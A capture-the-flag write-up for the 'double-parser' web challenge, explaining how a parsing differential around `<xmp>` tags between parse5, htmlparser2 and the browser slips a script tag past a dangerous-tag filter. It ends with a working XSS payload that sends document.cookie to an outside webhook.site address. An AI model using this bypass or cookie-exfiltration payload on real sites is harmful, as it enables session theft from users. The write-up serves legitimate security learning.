# double-parser&emsp;<sub><sup>Web, 221 points</sup></sub>

_Writeup by [@bluepichu](https://github.com/bluepichu)_

The service implements an HTML preview tool though does the following validation before rendering the HTML:

1. It must be an ASCII string of length at most 1024.
2. It will get parsed with cheerio with parse5, and must not be detected as containing any "dangerous tags".
3. It will get serialized and parsed again with cheerio with htmlparser2, and must again not be detected as containing any "dangerous tags".
4. It will then finally be served to the user as an HTML page, with the CSP `script-src: 'self'`.

The "dangerous tags" are anything that might result in code execution or parsing issues: `script`, `noscript`, `iframe`, `frame`, `object`, `embed`, `template`, `meta`, `svg`, and `math`.

The problem sounds like it's asking for parser differentials between parse5, htmlparser2, and the browser, so that's where we focused most of our energy.  We pretty quickly stumbled across [this GitHub issue](https://github.com/fb55/htmlparser2/issues/1789), which nodes that htmlparser2 does not handle `<xmp>` tags correctly.  This tag is special in that its content should not be parsed, and all content until the closing `</xmp>` tag should be treated as text.  Since htmlparser2 does not understand this tag, it means that we can trick it into improperly parsing its contents as HTML, possibly containing other tags, to get a differential between it, parse5, and the browser.

After playing around with this for a while, 5w1Min and I came up with the following payload:

```html
<div><xmp></div><style></xmp><!--</style><xmp><style></xmp><script src='somepathhere'></script>-->
```

parse5 will properly parse this as:

```
<div>
	<xmp>
		</div><style>
	</xmp>
	<!--
		</style><xmp><style></xmp><script src='somepathhere'></script>
	-->
</div> <!-- * -->
```

In an effort to normalize its output, it will add the missing `</div>` and the end, marked with the `<!-- * -->`.  The only tags it sees are `<div>` and `<xmp>`, so it does not fail the dangerous tags checks.  It will also add `<html>`, `<head>`, and `<body>` tags around the content, though these are not relevant to how it will get parsed downstream, so I will omit them.  Excluding those extra wrapping tags, we end up with the following output:

htmlparser2 will receive this as input and will parse it as:

```
<div>
	<xmp>
	</xmp> <!-- * -->
</div>
<style>
	</xmp><!--
</style>
<xmp>
	<style>
		</xmp><script src='somepathhere'></script>--></div>
	</style> <!-- * -->
</xmp> <!-- * -->
```

As before, the lines marked with `<!-- * -->` are added by htmlparser2 to normalize its output.  Note that it tries to close the first `<xmp>` tag when it sees the `</div>` closing tag since it doesn't understand that it should be treating the `</div>` as text rather than more markup, and it wants to close the inner element since its containing element is being closed.  The only tags it sees are `<div>`, `<xmp>`, and `<style>`, so it does not fail the dangerous tags checks.

Finally, the browser will receive this as input and will parse it as:

```
<div>
	<xmp></xmp>
</div>
<style>
	</xmp><!--
</style>
<xmp>
	<style>
</xmp>
<script src='somepathhere'></script>
-->
</div>
</style>
</xmp>
```

This results in the `<script>` tag getting executed.

We got stuck here for a while because we couldn't figure out how to make a valid JS file get returned by the server, since the response would always start with `<`, which is never valid JS.  We called it a night, but while we were gone, Ming figured out that the browser will also allow `<!--` to act as a JS comment, leading to the final payload:

```
<div><xmp></div><style></xmp><!--</style><xmp><style></xmp><script src='/?html=%3C%21--+%0Anavigator.sendBeacon%28%27https%3A%2F%2Fwebhook.site%2Fb13f3caa-9c58-488f-b906-c2436241fa2a%27%2Cdocument.cookie%29%2F%2F --%3E'></script>-->
```
